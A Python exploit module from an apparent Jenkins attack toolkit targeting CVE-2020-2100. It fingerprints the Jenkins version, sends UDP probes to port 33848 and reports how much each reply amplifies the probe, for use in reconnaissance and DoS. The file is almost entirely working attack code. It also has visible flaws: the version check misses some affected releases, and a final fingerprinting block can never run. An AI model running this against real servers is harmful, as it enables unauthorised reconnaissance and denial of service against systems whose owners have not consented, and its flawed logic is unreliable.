"""
CVE-2020-2100: Jenkins UDP Amplification Reflection DoS

This vulnerability allows triggering a UDP-based amplification attack that can be used
for reconnaissance or as part of a DoS chain. While not direct RCE, it's useful for
understanding Jenkins network exposure and triggering diagnostic responses.
"""

import requests
import socket
from rich.console import Console
from exploits import ExploitMetadata, ExploitResult

console = Console()

CVE_ID = "CVE-2020-2100"
cve = CVE_ID

METADATA = ExploitMetadata(
    cve_id=CVE_ID,
    name="Jenkins UDP Amplification Reflection Attack",
    description="UDP amplification vulnerability allowing DoS and network reconnaissance",
    affected_versions=["< 2.204.2", ">= 2.205 < 2.219"],
    mitre_attack=["T1499", "T1046"],
    severity="medium",
    references=[
        "https://www.jenkins.io/security/advisory/2020-01-29/",
        "https://nvd.nist.gov/vuln/detail/CVE-2020-2100",
        "https://github.com/advisories/GHSA-gpxv-776p-7gc7"
    ],
    requires_auth=False,
    requires_crumb=False,
    tags=["dos", "reconnaissance", "network"]
)

affected_versions = METADATA.affected_versions
mitre_attack = METADATA.mitre_attack
severity = METADATA.severity
description = METADATA.description
requires_auth = METADATA.requires_auth
requires_crumb = METADATA.requires_crumb
tags = METADATA.tags


def check_vulnerable(tool, **kwargs):
    """
    Check if the target Jenkins instance is vulnerable.
    
    Args:
        tool: JenkinsBreaker instance
        **kwargs: Additional arguments
        
    Returns:
        bool: True if potentially vulnerable, False otherwise
    """
    try:
        r = requests.get(
            f"{tool.jenkins_url}/api/json",
            proxies=tool.proxies,
            verify=False,
            timeout=5
        )
        
        if r.status_code == 200:
            data = r.json()
            version = data.get('version', '')
            
            if version:
                version_parts = version.split('.')
                try:
                    major = int(version_parts[0])
                    minor = int(version_parts[1]) if len(version_parts) > 1 else 0
                    
                    if major == 2 and minor < 204:
                        return True
                    elif major == 2 and 205 <= minor < 219:
                        return True
                except:
                    pass
        
        return False
    except:
        return False


def run(tool, lhost=None, lport=None, **kwargs):
    """
    Exploit CVE-2020-2100 for UDP reflection reconnaissance.
    
    Args:
        tool: JenkinsBreaker instance
        lhost: Not used for this exploit
        lport: UDP port to test (default 33848)
        **kwargs: Additional arguments
        
    Returns:
        ExploitResult: Result of the exploit
    """
    console.print(f"[yellow][*] Running {CVE_ID} exploit (UDP Amplification Reconnaissance)...[/yellow]")
    
    udp_port = kwargs.get('udp_port', 33848)
    target_host = tool.jenkins_url.split('//')[1].split(':')[0] if '//' in tool.jenkins_url else tool.jenkins_url.split(':')[0]
    
    console.print(f"[cyan][*] Testing UDP reflection on {target_host}:{udp_port}...[/cyan]")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(3)
        
        probe_messages = [
            b'\x00\x00\x00\x00',
            b'Jenkins',
            b'\x00\x01\x00\x00',
        ]
        
        responses = []
        
        for idx, probe in enumerate(probe_messages):
            try:
                sock.sendto(probe, (target_host, udp_port))
                
                try:
                    data, addr = sock.recvfrom(1024)
                    responses.append({
                        "probe": idx + 1,
                        "response_size": len(data),
                        "amplification_factor": len(data) / len(probe) if len(probe) > 0 else 0
                    })
                    console.print(f"[green][+] UDP response received (probe {idx + 1}): {len(data)} bytes[/green]")
                except socket.timeout:
                    console.print(f"[yellow][-] No response to probe {idx + 1}[/yellow]")
            except Exception as e:
                console.print(f"[red][!] Error with probe {idx + 1}: {e}[/red]")
        
        sock.close()
        
        if responses:
            return ExploitResult(
                exploit=CVE_ID,
                status="success",
                details=f"UDP reflection detected with {len(responses)} responding probes",
                data={
                    "target": target_host,
                    "port": udp_port,
                    "responses": responses,
                    "max_amplification": max([r["amplification_factor"] for r in responses]) if responses else 0
                }
            )
        else:
            console.print("[yellow][*] No UDP responses detected (service may be patched or filtered)[/yellow]")
            return ExploitResult(
                exploit=CVE_ID,
                status="not_vulnerable",
                details="No UDP reflection responses received"
            )
            
    except Exception as e:
        console.print(f"[red][!] UDP reconnaissance failed: {e}[/red]")
        return ExploitResult(
            exploit=CVE_ID,
            status="failed",
            details=f"UDP test failed: {str(e)}"
        )
    
    try:
        version_url = f"{tool.jenkins_url}/api/json"
        r = requests.get(
            version_url,
            proxies=tool.proxies,
            verify=False,
            timeout=5
        )
        
        if r.status_code == 200:
            data = r.json()
            version = data.get('version', 'unknown')
            
            console.print(f"[cyan][*] Jenkins version: {version}[/cyan]")
            
            return ExploitResult(
                exploit=CVE_ID,
                status="info",
                details=f"Version fingerprinting successful: {version}",
                data={"version": version, "vulnerable_to_udp": False}
            )
    except:
        pass
    
    return ExploitResult(
        exploit=CVE_ID,
        status="failed",
        details="Unable to exploit or fingerprint target"
    )
